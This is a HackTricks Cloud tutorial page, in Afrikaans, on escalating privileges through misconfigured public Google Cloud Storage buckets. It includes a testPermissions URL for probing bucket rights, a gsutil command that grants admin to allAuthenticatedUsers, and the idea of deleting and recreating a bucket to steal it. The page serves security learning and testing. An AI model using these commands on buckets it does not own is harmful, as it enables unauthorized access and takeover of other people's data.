# GCP - Openbare Emmers Voorregskaping

{% hint style="success" %}
Leer en oefen AWS-hacking: <img src="/.gitbook/assets/image.png" alt="" data-size="line">[**HackTricks Opleiding AWS Red Team Expert (ARTE)**](https://training.hacktricks.xyz/courses/arte)<img src="/.gitbook/assets/image.png" alt="" data-size="line">\
Leer en oefen GCP-hacking: <img src="/.gitbook/assets/image (2).png" alt="" data-size="line">[**HackTricks Opleiding GCP Red Team Expert (GRTE)**<img src="/.gitbook/assets/image (2).png" alt="" data-size="line">](https://training.hacktricks.xyz/courses/grte)

<details>

<summary>Ondersteun HackTricks</summary>

* Controleer de [**abonnementsplannen**](https://github.com/sponsors/carlospolop)!
* **Sluit aan by die** üí¨ [**Discord-groep**](https://discord.gg/hRep4RUj7f) of die [**telegram-groep**](https://t.me/peass) of **volg** ons op **Twitter** üê¶ [**@hacktricks\_live**](https://twitter.com/hacktricks\_live)**.**
* **Deel hacktruuks deur PR's in te dien by die** [**HackTricks**](https://github.com/carlospolop/hacktricks) en [**HackTricks Cloud**](https://github.com/carlospolop/hacktricks-cloud) github-opslag.

</details>
{% endhint %}

## Emmers Voorregskaping

Indien die emmerbeleid "allUsers" of "allAuthenticatedUsers" toegelaat het om **na hul emmerbeleid te skryf** (die **storage.buckets.setIamPolicy** toestemming)**,** dan kan enigiemand die emmerbeleid wysig en homself volle toegang gee.

### Kontroleer Toestemmings

Daar is 2 maniere om die toestemmings oor 'n emmer te kontroleer. Die eerste een is om dit te vra deur 'n versoek te maak na `https://www.googleapis.com/storage/v1/b/BUCKET_NAME/iam` of deur `gsutil iam get gs://BUCKET_NAME` uit te voer.

Maar, as jou gebruiker (moontlik behorend tot allUsers of allAuthenticatedUsers") nie toestemmings het om die iam-beleid van die emmer te lees (storage.buckets.getIamPolicy), sal dit nie werk nie.

Die ander opsie wat altyd sal werk, is om die testPermissions eindpunt van die emmer te gebruik om uit te vind of jy die gespesifiseerde toestemming het, byvoorbeeld deur toegang te verkry tot: `https://www.googleapis.com/storage/v1/b/BUCKET_NAME/iam/testPermissions?permissions=storage.buckets.delete&permissions=storage.buckets.get&permissions=storage.buckets.getIamPolicy&permissions=storage.buckets.setIamPolicy&permissions=storage.buckets.update&permissions=storage.objects.create&permissions=storage.objects.delete&permissions=storage.objects.get&permissions=storage.objects.list&permissions=storage.objects.update`

### Voorregskaping

Om `Stoor Admin` aan `allAuthenticatedUsers` toe te ken, is dit moontlik om uit te voer:
```
gsutil iam ch group:allAuthenticatedUsers:admin gs://BUCKET_NAME
```
'n Ander aanval sou wees om **die emmer te verwyder en dit in jou rekening te herskep om die eienaarskap te steel**.

## Verwysings

* [https://rhinosecuritylabs.com/gcp/google-cloud-platform-gcp-bucket-enumeration/](https://rhinosecuritylabs.com/gcp/google-cloud-platform-gcp-bucket-enumeration/)

{% hint style="success" %}
Leer & oefen AWS-hacking:<img src="/.gitbook/assets/image.png" alt="" data-size="line">[**HackTricks Opleiding AWS Red Team Expert (ARTE)**](https://training.hacktricks.xyz/courses/arte)<img src="/.gitbook/assets/image.png" alt="" data-size="line">\
Leer & oefen GCP-hacking: <img src="/.gitbook/assets/image (2).png" alt="" data-size="line">[**HackTricks Opleiding GCP Red Team Expert (GRTE)**<img src="/.gitbook/assets/image (2).png" alt="" data-size="line">](https://training.hacktricks.xyz/courses/grte)

<details>

<summary>Ondersteun HackTricks</summary>

* Kontroleer die [**inskrywingsplanne**](https://github.com/sponsors/carlospolop)!
* **Sluit aan by die** üí¨ [**Discord-groep**](https://discord.gg/hRep4RUj7f) of die [**telegram-groep**](https://t.me/peass) of **volg** ons op **Twitter** üê¶ [**@hacktricks\_live**](https://twitter.com/hacktricks\_live)**.**
* **Deel hacktruuks deur PR's in te dien by die** [**HackTricks**](https://github.com/carlospolop/hacktricks) en [**HackTricks Cloud**](https://github.com/carlospolop/hacktricks-cloud) github-opslag.

</details>
{% endhint %}
